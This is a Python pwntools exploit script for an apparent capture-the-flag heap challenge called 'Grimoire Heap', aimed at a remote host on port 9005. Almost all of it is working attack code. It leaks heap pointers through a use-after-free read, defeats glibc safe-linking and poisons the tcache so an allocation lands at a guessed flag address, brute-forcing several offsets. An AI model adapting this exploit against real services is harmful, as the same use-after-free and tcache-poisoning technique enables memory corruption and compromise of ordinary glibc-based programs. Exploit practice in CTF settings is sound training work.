#!/usr/bin/env python3
"""
Grimoire Heap - Brute force offset approach
Try different offsets to find g_flag
"""
from pwn import *
import sys

context.log_level = 'warning'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)
    return data

# Try different offsets
# Based on analysis: tcache_struct (0x290) + g_flag (0x90) = 0x320
# spell0 should be at heap_base + 0x320
# g_flag user data at heap_base + 0x2a0
# So g_flag = spell0 - 0x90

offsets_to_try = [0x90, 0x330, 0x2a0, 0x320, 0x100, 0x200, 0x1000, 0x2000]

for offset in offsets_to_try:
    try:
        p = connect()
        p.recvuntil(b'> ')

        # Create 2 spells
        create(p, 0, 0x80, b'A' * 0x10 + b'\n')
        create(p, 1, 0x80, b'B' * 0x10 + b'\n')

        # Banish both
        banish(p, 0)
        banish(p, 1)

        # Read UAF
        data1 = recite(p, 1, 0x80)
        fd1 = u64(data1[0:8])
        data0 = recite(p, 0, 0x80)
        fd0 = u64(data0[0:8])

        spell0_addr = fd0 << 12
        spell1_shifted = fd1 ^ spell0_addr
        spell1_addr = spell1_shifted << 12

        g_flag_addr = spell0_addr - offset
        print(f"[*] offset={hex(offset)}: spell0={hex(spell0_addr)}, g_flag={hex(g_flag_addr)}")

        # Poison tcache
        protected_g_flag = (spell1_addr >> 12) ^ g_flag_addr
        payload = p64(protected_g_flag) + b'\x00' * (0x80 - 8)
        edit(p, 1, 0x80, payload)

        # Allocate
        create(p, 2, 0x80, b'C' * 0x10 + b'\n')
        create(p, 3, 0x80, b'\n')

        # Read
        data = recite(p, 3, 0x80)

        # Check for flag
        if b'flag' in data.lower() or b'CTF' in data or b'{' in data:
            print(f"[+] FOUND with offset {hex(offset)}!")
            print(f"[+] Data: {data}")
            p.interactive()
            sys.exit(0)
        else:
            # Check if data is all zeros (wrong address)
            non_zero = sum(1 for b in data if b != 0)
            print(f"    non-zero bytes: {non_zero}")
            if non_zero > 0:
                print(f"    data[:32]: {data[:32].hex()}")

        p.sendline(b'0')
        p.close()
    except Exception as e:
        print(f"[-] offset={hex(offset)} failed: {e}")
        try:
            p.close()
        except:
            pass

print("[-] No offset worked. Need different approach.")
